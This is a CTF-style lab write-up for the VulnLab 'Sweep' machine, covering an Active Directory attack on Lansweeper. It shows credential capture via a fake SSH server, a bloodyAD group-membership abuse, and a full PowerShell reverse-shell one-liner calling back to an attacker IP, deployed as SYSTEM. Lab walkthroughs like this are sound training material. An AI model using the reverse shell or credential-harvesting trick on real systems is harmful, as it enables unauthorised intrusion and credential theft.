# Sweep

Platform: VulnLab
Difficulty: medium
OS: Windows
Category: Active Directory
Tags: Lansweeper, Credential Harvesting, BloodHound, GenericAll
Date: 2026-06-30

![image.png](image.png)

This machine from **Vulnlab** is all about exploiting **Lansweeper** an IT discovery and inventory platform. It starts from a weak password from an `intern` account, faked an SSH to scan with so that the plain text password of `svc_inventory_lnx` will be revealed. Added itself to the **Remote Access Servers** group. Then, deployed a reverse shell from **Lansweeper**.

Now in order to get the credential for `svc_inventory_lnx` account, we need to trick **Lansweeper** to scan our host so that it will try to authenticate on our fake SSH. Download this tool

[https://github.com/fffaraz/fakessh](https://github.com/fffaraz/fakessh)

```bash
go install github.com/fffaraz/fakessh@latest
sudo setcap 'cap_net_bind_service=+ep' ~/go/bin/fakessh
fakessh [optional-log-directory]
```

Now in **Lansweeper** at *Scanning → Scanning targets* click **Add scanning targets** then on *target type* find and choose **IP range**. You can just input your tun0 IP on both *start* and *end*.

![image.png](image%202.png)

Notice that it will try to connect on port 22 which is SSH. Click **Ok** and it will be added on the table. Then click **scan now** to intercept the credential **(your fakessh should be running already).**

If the scanning is done, and no output in the terminal, find the log of fakessh, the credential is in there.

![image.png](image%203.png)

Now that we have `svc_inventory_lnx`'s password, we just need to get remote access. Looking at the bloodhound graph above, the group that `svc_inventory_lnx` is a member of has `GenericAll` permission to **LANDSWEEPER ADMINS**, its member here is `JGRE808` where the **LANDSWEEPER ADMINS** group is also a member of **REMOTE MANAGEMENT USERS** group. So what we’ll do here is just add `svc_inventory_lnx` to the group **LANDSWEEPER ADMINS**.

```bash
bloodyAD -d sweep.vl -u svc_inventory_lnx -p '<REDACTED>' --host 10.10.75.23 add groupMember 'LANSWEEPER ADMINS' svc_inventory_lnx
```

## SYSTEM

To escalate the privilege, we need to go back to **Lansweeper,** and login as `svc_inventory_lnx`. To skip to the part, after countless enumeration, I found something interesting.

At *Configuration → User access & roles* and under *user roles*, we found out that `SWEEP\Lansweeper Admins` is under **Inventory Administrator**, and the permissions has **Access scanning credentials** and **Access deployments**

![image.png](image%207.png)

So under *Scanning → Scanning credentials* then on to *Credential mapping,* click **Map credentials**. On the *Mapping type,* find and choose *Windows Computer* and input `sweep/inventory` on *Domain/Computername* then select inventory windows

![image.png](image%208.png)

Then on *Deployment → Deployment packages* click on *New package* name it anything and add it.

![image.png](image%209.png)

Then under the package you created, click on *add steps.* Change the A*ction* to **Command**, name it anything. Then the command should be a PowerShell reverse shell, you can generate one at:

[https://www.revshells.com/](https://www.revshells.com/)

![image.png](image%2010.png)

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.7.143',4455);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

In you attacker machine. Setup a listener to intercept the reverse shell.

```bash
rlwrap nc -lvnp 4455 
```

Then click on *Deploy now* and on *Deploy on* select *Selection* then on *Select Assets* click on **INVENTORY**.

![image.png](image%2011.png)

Execute it and you will get a reverse shell with `NT AUTHORITY\SYSTEM`
